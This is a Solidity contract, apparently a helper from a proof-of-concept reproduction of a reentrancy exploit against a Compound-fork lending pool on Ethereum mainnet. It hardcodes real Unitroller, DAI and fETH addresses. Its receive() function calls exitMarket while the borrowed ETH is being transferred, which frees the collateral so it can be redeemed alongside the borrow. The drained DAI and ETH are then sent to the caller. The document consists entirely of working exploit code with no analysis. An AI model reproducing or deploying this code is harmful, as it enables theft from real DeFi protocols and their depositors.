// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "../HarvestFF/interfaces/IERC20.sol";
import "./interfaces/CErc20Interface.sol";
import "./interfaces/ComptrollerInterface.sol";


interface IFToken {
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function getCash() external view returns (uint);
    function totalBorrows() external view returns (uint256);
    function totalReserves() external view returns (uint256);
}

contract Convert144 {
    ComptrollerInterface private constant unitroller = ComptrollerInterface(0xC7125E3A2925877C7371d579D29dAe4729Ac9033); // Unitroller
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // balancer protocol flash loan check
    IERC20 private constant FRAX = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    
    // FxToken Address
    // 0xe92a3db67e4b6AC86114149F522644b34264f858
    address constant fETH = address(0x7DBC3aF9251756561Ce755fcC11c754184Af71F7); //fETH156
    address private fTokenCache;
    uint256 private mintTokenCache;

    constructor() {}

    receive () external payable {
        unitroller.exitMarket(fTokenCache);
    }   

    function _bootLoad(address fToken) external {
        fTokenCache = fToken;
        address[] memory em = new address[](1);
        em[0] = fToken;
        unitroller.enterMarkets(em);
    }
    function _cBorrow(uint cBorrow) external {
        IFToken(fETH).borrow(cBorrow);
    }

    function _cMint() external {
        DAI.approve(fTokenCache, type(uint256).max);
        uint _DAIBalance = DAI.balanceOf(address(this));
        CErc20Interface(fTokenCache).mint(_DAIBalance);
        mintTokenCache = _DAIBalance;
    }


    function _cRedeemAll() external {
        CErc20Interface(fTokenCache).approve(fTokenCache, type(uint256).max);
        CErc20Interface(fTokenCache).redeemUnderlying(mintTokenCache);

        uint256 new_DAIBalance = DAI.balanceOf(address(this));
        DAI.transfer(msg.sender, new_DAIBalance);
        payable(msg.sender).transfer(address(this).balance);
    }
}
